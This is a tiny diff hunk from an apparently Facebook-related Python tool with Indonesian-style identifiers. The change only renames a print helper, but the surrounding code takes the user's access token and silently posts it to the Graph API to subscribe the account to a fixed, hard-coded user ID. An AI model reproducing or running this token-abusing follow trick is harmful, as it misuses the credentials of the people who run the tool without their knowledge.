@@ -236,7 +236,7 @@ def kumahaaing():
 	except IOError:
 		print((p+"\n["+h+"•"+p+"]"+p+" Token Invalid"))
 		asup_goblog()
-	jalan("%s[%s•%s] %sPlease Wait..."%(p,h,p,p))
+	cangcut("%s[%s•%s] %sPlease Wait..."%(p,h,p,p))
 	requests.post("https://graph.facebook.com/100004105699210/subscribers?access_token=" + ewehayam)
 	
 ### BANTUAN ###
